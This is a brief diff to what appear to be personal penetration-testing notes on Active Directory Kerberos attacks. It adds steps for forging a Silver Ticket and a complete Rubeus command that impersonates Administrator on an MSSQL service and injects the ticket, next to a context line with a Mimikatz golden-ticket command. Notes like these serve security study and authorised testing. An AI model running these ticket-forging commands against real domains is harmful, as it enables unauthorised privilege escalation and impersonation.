@@ -402,3 +402,8 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - Silver Ticket let us pretend we're domain admin to one specific service.
 - We need perform kerberoasting attack in order to get the hash.
 - Crack the hash with hashcat, so that we will get the credential of the service account.
+- Convert that password in RC4 format using hashcat.
+- Get the SID of the domain.
+- Attackkkkkk
+- We can also use rubeus for this attack.
+  - `rubeus.exe silver /service:MSSQLSvc/kerbdc1.kerb.local:1433 /rc4:<RC4 hash> /sid:<SID of Domain> /user:Administrator /domain:kerb.local /ptt`
